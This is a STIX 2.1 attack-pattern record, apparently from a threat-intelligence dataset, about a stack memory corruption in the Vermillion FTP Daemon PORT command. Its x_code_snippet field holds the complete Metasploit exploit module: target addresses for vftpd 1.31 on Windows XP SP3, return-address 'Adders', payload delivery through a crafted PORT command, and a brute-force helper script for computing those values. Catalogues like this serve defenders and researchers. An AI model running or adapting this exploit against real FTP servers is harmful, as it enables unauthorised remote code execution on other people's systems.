{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--1dfc4f7f-8cbc-4264-a40c-742d4e073618",
    "created": "2024-08-14T16:51:11.520527Z",
    "modified": "2024-08-14T16:51:11.520531Z",
    "name": "Vermillion FTP Daemon PORT Command Memory Corruption",
    "description": " This module exploits an out-of-bounds array access in the Arcane Software Vermillion FTP server. By sending a specially crafted FTP PORT command an attacker can corrupt stack memory and execute arbitrary code.  This particular issue is caused by processing data bound by attacker controlled input while writing into a 4 byte stack buffer. Unfortunately the writing that occurs is not a simple byte copy.  Processing is done using a source ptr (p) and a destination pointer (q). The vulnerable function walks the input string and continues while the source byte is non-null. If a comma is encountered, the function increments the destination pointer. If an ascii digit [0-9] is encountered, the following occurs:  *q = (*q * 10) + (*p - '0');  All other input characters are ignored in this loop.  As a consequence, an attacker must craft input such that modifications to the current values on the stack result in usable values. In this exploit the low two bytes of the return address are adjusted to point at the location of a 'call edi' instruction within the binary. This was chosen since 'edi' points at the source buffer when the function returns.  NOTE: This server can be installed as a service using \"vftpd.exe install\". If so, the service does not restart automatically, giving an attacker only one attempt. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/ftp/vermillion_ftpd_port.rb",
            "external_id": "vermillion_ftpd_port.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = GreatRanking\n\n  include Msf::Exploit::Remote::Ftp\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'Vermillion FTP Daemon PORT Command Memory Corruption',\n      'Description'    => %q{\n          This module exploits an out-of-bounds array access in the Arcane Software\n        Vermillion FTP server. By sending a specially crafted FTP PORT command,\n        an attacker can corrupt stack memory and execute arbitrary code.\n\n        This particular issue is caused by processing data bound by attacker\n        controlled input while writing into a 4 byte stack buffer. Unfortunately,\n        the writing that occurs is not a simple byte copy.\n\n        Processing is done using a source ptr (p) and a destination pointer (q).\n        The vulnerable function walks the input string and continues while the\n        source byte is non-null. If a comma is encountered, the function increments\n        the destination pointer. If an ascii digit [0-9] is encountered, the\n        following occurs:\n\n          *q = (*q * 10) + (*p - '0');\n\n        All other input characters are ignored in this loop.\n\n        As a consequence, an attacker must craft input such that modifications\n        to the current values on the stack result in usable values. In this exploit,\n        the low two bytes of the return address are adjusted to point at the\n        location of a 'call edi' instruction within the binary. This was chosen\n        since 'edi' points at the source buffer when the function returns.\n\n        NOTE: This server can be installed as a service using \"vftpd.exe install\".\n        If so, the service does not restart automatically, giving an attacker only\n        one attempt.\n      },\n      'Author'         =>\n        [\n          'jduck'   # metasploit module\n        ],\n      'References'     =>\n        [\n          [ 'OSVDB', '62163' ],\n          [ 'EDB', '11293' ]\n        ],\n      'DefaultOptions' =>\n        {\n          'EXITFUNC' => 'process'\n        },\n      'Privileged'     => true,\n      'Payload'        =>\n        {\n          # format string max length\n          'Space'    => 1024,\n          'BadChars' => \"\\x00\\x08\\x0a\\x0d\\x2c\\xff\",\n          'DisableNops'\t=>  'True'\n        },\n      'Platform'       => 'win',\n      'Targets'        =>\n        [\n          #\n          # Automatic targeting via fingerprinting\n          #\n          [ 'Automatic Targeting', { 'auto' => true }  ],\n\n          #\n          # specific targets\n          #\n          [\t'vftpd 1.31 - Windows XP SP3 English',\n            {\n              # call edi in vftpd.exe (v1.31)\n              'OldRet' => 0x405a73, # not used directly\n              'Ret' \t=> 0x4058e3, # not used directly\n              'Offset' => 16,       # distance to saved return\n              'Adders' => \"171,48\"  # adjust the bottom two bytes\n            }\n          ]\n        ],\n      'DisclosureDate' => '2009-09-23',\n      'DefaultTarget'  => 0))\n\n    register_options(\n      [\n        Opt::RPORT(21),\n      ])\n  end\n\n\n  def check\n    connect\n    disconnect\n    vprint_status(\"FTP Banner: #{banner}\".strip)\n    if banner =~ /\\(vftpd .*\\)/\n      return Exploit::CheckCode::Detected\n    end\n    return Exploit::CheckCode::Safe\n  end\n\n\n  def exploit\n\n    # Use a copy of the target\n    mytarget = target\n\n    if (target['auto'])\n      mytarget = nil\n\n      print_status(\"Automatically detecting the target...\")\n      connect\n      disconnect\n\n      if (banner and (m = banner.match(/\\(vftpd (.*)\\)/))) then\n        print_status(\"FTP Banner: #{banner.strip}\")\n        version = m[1]\n      else\n        print_status(\"No matching target\")\n        return\n      end\n\n      self.targets.each do |t|\n        if (t.name =~ /#{version} - /) then\n          mytarget = t\n          break\n        end\n      end\n\n      if (not mytarget)\n        print_status(\"No matching target\")\n        return\n      end\n\n      print_status(\"Selected Target: #{mytarget.name}\")\n    else\n      print_status(\"Trying target #{mytarget.name}...\")\n    end\n\n\n    connect\n\n    stuff = payload.encoded\n    # skip 16 bytes\n    stuff << \",\" * mytarget['Offset']\n    # now we change the return address to be what we want\n    stuff << mytarget['Adders']\n\n    if (res = send_cmd(['PORT', stuff]))\n      print_status(res.strip)\n    end\n\n    disconnect\n    handler\n\n  end\nend\n\n\n=begin\n\nNOTE: the following code was used to obtain the \"Adders\" target value.\nI'm not extremely pleased with this solution, but I haven't come up with\na more elegant one...\n\n=========================\n#!/usr/bin/env ruby\n#\n# usage: ./find_adder.rb <old ret> <new ret>\n# example: ./find_adder.rb 0x405a73 0x004058e3\n#\n\n$old_ret = ARGV.shift.to_i(16)\n$new_ret = ARGV.shift.to_i(16)\n\noret = [$old_ret].pack('V').unpack('C*')\nnret = [$new_ret].pack('V').unpack('C*')\n\n\ndef process_idx(oret, nret, adders, idx)\n  new_val = oret[idx]\n  digits = adders[idx].to_s.unpack('C*')\n  digits.each { |dig|\n    dig -= 0x30\n    new_val = (new_val * 10) + dig\n  }\n  return (new_val & 0xff)\nend\n\n\n# brute force approach!\nfinal_adders = [ nil, nil, nil, nil ]\n\nadders = []\n4.times { |idx|\n  next if (oret[idx] == nret[idx])\n  10.times { |x|\n    10.times { |y|\n      10.times { |z|\n        adders[idx] = (x.to_s + y.to_s + z.to_s).to_i\n\n        val = process_idx(oret, nret, adders, idx)\n        if (val == nret[idx])\n          final_adders[idx] = adders[idx]\n        end\n\n        break if (final_adders[idx])\n      }\n      break if (final_adders[idx])\n    }\n    break if (final_adders[idx])\n  }\n}\n\n\n# check/print the solution\neret = []\n4.times { |idx|\n  eret << process_idx(oret, nret, adders, idx)\n}\nfinal = eret.pack('C*').unpack('V')[0]\nif (final == $new_ret)\n  puts final_adders.join(',')\n  exit(0)\nend\n\nputs \"unable to find a valid solution!\"\nexit(1)\n\n=end\n",
    "x_mitre_disclosure_date": "2009-09-23",
    "x_mitre_platforms": [
        "win'"
    ]
}